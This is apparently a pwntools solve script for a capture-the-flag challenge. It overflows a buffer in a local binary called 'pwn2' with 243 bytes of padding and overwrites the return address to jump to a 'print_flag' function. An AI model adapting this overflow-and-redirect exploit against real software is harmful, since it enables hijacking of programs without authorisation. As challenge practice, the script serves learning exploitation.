#!/usr/bin/env python

from pwn import *
import os
import sys

context.arch = 'i386'
context.log_level = 'debug'

io = process('./pwn2') 

packer = make_packer(32, endian='little', sign='unsigned')
unpacker = make_unpacker(32, endian='little', sign='unsigned')

def exploit():
    try:
        io.recvuntil('I bet I can repeat anything you tell me!')
        io.send('A' * 243)
	io.sendline(packer(0x0804854b)) # address to print_flag function
        io.interactive()

    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
